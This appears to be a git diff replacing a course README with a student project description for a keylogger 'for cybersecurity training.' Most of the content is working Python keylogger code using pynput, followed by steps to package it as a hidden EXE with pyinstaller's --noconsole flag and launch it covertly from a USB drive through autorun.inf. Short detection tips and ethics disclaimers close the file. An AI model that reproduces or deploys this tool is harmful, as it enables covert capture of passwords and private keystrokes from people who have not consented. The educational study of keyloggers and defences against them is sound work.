@@ -1,5 +1,147 @@
-# This is your README file.
+# **Keylogger Project for Cybersecurity Training**  
 
-I have uploaded this for you, it is customary to have a README file within GitHub to insure that there is some documentation. Please let me know if you needed any other help. Also this is written in a language called "Markdown". I have linked it here [here](https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax)
+### **By:** Bilal Sihadi & Mohamed Rouabhi  
+### **Course:** CIS 260  
+### **Professor:** MD Ali  
+### **Date:** 01-24-2025  
 
-Please let me know if you needed any help and make sure to submit your project proposal. - Md Ali
+---
+
+## 📌 **Project Overview**  
+This project is about developing a **keylogger** for **educational and ethical use** in cybersecurity training. The goal is to understand how keyloggers work, how they can capture sensitive data, and how to detect and prevent them.  
+
+⚠ **Important:** This project is **only for learning purposes**. Using keyloggers without permission is illegal. Always follow ethical hacking guidelines.  
+
+---
+
+## 🎯 **Project Goals**  
+- ✅ Build a **software-based keylogger** using **Python**.  
+- ✅ Deploy a **USB-based keylogger** that runs when plugged into a computer.  
+- ✅ Study how keyloggers work on **Windows and Linux**.  
+- ✅ Research and test **detection & prevention methods**.  
+
+---
+
+##  **Features**  
+### **🔹 Software Keylogger**  
+- Records **all keystrokes** (letters, numbers, special keys).  
+- Saves logs **locally** with **timestamps**.  
+- Works on **Windows & Linux**.  
+- Can run in **stealth mode**.  
+
+### **🔹 USB-Based Keylogger (Software Approach)**  
+- Runs automatically when plugged into a Windows machine.  
+- Stores captured keystrokes on the USB drive.  
+- Uses **Python and AutoRun scripts**.  
+- No need for special hardware.  
+
+---
+
+##  **How to Install & Run**  
+
+### **1️⃣ Software Keylogger (Python)**  
+#### **Requirements:**  
+- Python 3.13  
+- Required library: `pynput`  
+
+#### **Installation:**  
+```sh
+pip install pynput
+```
+
+#### **Keylogger Code (Python)**  
+Copy and save the following code as **keylogger.py**:
+
+```python
+from pynput import keyboard
+from datetime import datetime
+
+def keyPressed(key):    
+    """ Handles key press events, logs the key pressed along with the timestamp. """
+    
+    print(str(key))  # Print the key pressed for debugging
+    with open("keyfile.txt", 'a') as logKey:
+        try:
+            # Log printable character keys with timestamp
+            char = key.char
+            logKey.write(f"{datetime.now()} - {char}\n")
+        except AttributeError:
+            # Log special keys with timestamp in brackets
+            logKey.write(f"{datetime.now()} - [{str(key)}]\n")
+
+if __name__ == "__main__":
+    # Initialize the key listener
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()  # Start listening
+    input()  # Keep the script running
+```
+
+#### **Run the Keylogger:**  
+```sh
+python keylogger.py
+```
+- The script will record all keystrokes and store them in **keyfile.txt**.  
+
+---
+
+### **2️⃣ USB Keylogger Setup (Windows - Software-Based)**  
+This method turns a normal USB drive into a **portable keylogger** that starts when plugged into a Windows computer.  
+
+#### **Step 1: Convert the Keylogger to an Executable**  
+To run without needing Python installed, convert it into an **EXE file**:  
+```sh
+pip install pyinstaller
+pyinstaller --onefile --noconsole keylogger.py
+```
+- This will create an EXE file in the `dist/` folder.  
+- Move `dist/keylogger.exe` to the USB drive.  
+
+---
+
+#### **Step 2: Create an Autorun Script**  
+1. Open Notepad and paste the following:  
+   ```ini
+   [Autorun]
+   open=keylogger.exe
+   action=Open folder to view files
+   ```
+2. Save this as **autorun.inf** on the USB drive.  
+
+---
+
+#### **Step 3: Plug the USB Into a Windows Computer**  
+- If **AutoRun** is enabled, `keylogger.exe` will start running in the background.  
+- If not, manually open the USB and **run keylogger.exe**.  
+
+---
+
+##  **How to Detect & Prevent Keyloggers**  
+- **Disable AutoRun & AutoPlay** to prevent automatic execution.  
+- **Use antivirus & endpoint security tools**.  
+- **Monitor running processes** for suspicious activity.  
+- **Encrypt sensitive keystrokes** to prevent logging.  
+
+---
+
+##  **Ethical Considerations**  
+- This project is for **learning and research only**.  
+- Testing is done in a **controlled environment** (no real user data).  
+- Always get **permission** before using keyloggers.  
+
+---
+
+##  **Expected Outcomes**  
+- A **fully working keylogger** for **ethical training**.  
+- A report on **how to detect and prevent keyloggers**.  
+- A better understanding of **cybersecurity threats**.  
+
+---
+
+##  **Contributors**  
+  **Bilal Sihadi**  
+  **Mohamed Rouabhi**  
+
+---
+
+##  **License**  
+This project is for educational purposes only and must not be used for malicious activities.  
